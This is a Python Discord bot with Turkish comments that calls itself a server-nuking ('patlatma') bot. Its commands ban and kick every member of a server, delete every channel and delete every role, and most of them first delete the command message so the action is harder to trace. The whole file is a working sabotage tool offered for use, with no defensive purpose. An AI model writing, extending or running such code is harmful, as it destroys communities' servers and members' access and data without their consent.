import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio

### CONFIG ###
sebep = 'sunucu patlatıldı'
token = 'TOKEN'
### CONFIG ###

client = commands.Bot(command_prefix='.')

@client.event
async def on_ready():
    print ('ege\'nin patlatma botu hazır! release v1.')


#Tüm üyeleri banla
@client.command(pass_context=True, aliases=['massban'])
async def topluban(ctx):
        await ctx.message.delete()
        print(f'{ctx.author} tüm üyeleri banlama komutunu kullandı! {ctx.guild.name} sunucusundaki tüm üyeler banlanacak.')
        for user in list(ctx.guild.members):
            try:
                await user.ban(reason=sebep)
                print(f'{ctx.guild.name} sunucusundaki {user.name} adlı üyeyi banlandım!')
            except:
                print(f'{ctx.guild.name} sunucusundaki {user.name} adlı üye banlanılamadı...')
        print('Banlama işlemi bitti.')


#Tüm üyeleri at
@client.command(pass_context=True, aliases=['toplukick', 'masskick'])
async def topluatma(ctx):
        await ctx.message.delete()
        print(f'{ctx.author} tüm üyeleri atma komutunu kullandı! {ctx.guild.name} sunucusundaki tüm üyeler atılacak.')
        for user in list(ctx.guild.members):
            try:
                await user.kick(reason=sebep)
                print(f'{ctx.guild.name} sunucusundaki {user.name} adlı üyeyi attım!')
            except:
                print(f'{ctx.guild.name} sunucusundaki {user.name} adlı üye atılamadı...')
        print('Atma işlemi bitti.')


#Tüm kanalları sil
@client.command(pass_context=True, aliases=['masschanneldelete', 'deletechannels'])
async def kanallarısil(ctx):
        print(f'{ctx.author} kanalları silme komutunu kullandı! {ctx.guild.name} sunucusundaki tüm kanallar silinecek.')
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete(reason=sebep)
                print (f'{ctx.guild.name} sunucusundaki {channel.name} kanalını sildim!')
            except:
                print (f'{ctx.guild.name} sunucusundaki {channel.name} kanalını silemedim...')
        print('Kanal silme işlemi bitti.')


#Tüm rolleri sil
@client.command(pass_context=True, aliases=['deleteroles'])
async def rollerisil(ctx):
        await ctx.message.delete()
        print(f'{ctx.author} rolleri silme komutunu kullandı! {ctx.guild.name} sunucusundaki tüm roller silinecek.')
        for role in list(ctx.guild.roles):
            try:
                await role.delete(reason=sebep)
                print(f'{ctx.guild.name} sunucusundaki {role.name} rolü silindi.')
            except:
                print (f'{ctx.guild.name} sunucusundaki {role.name} rolünü silemedim...')    
        print('Rol silme işlemi bitti.')


client.run(token)
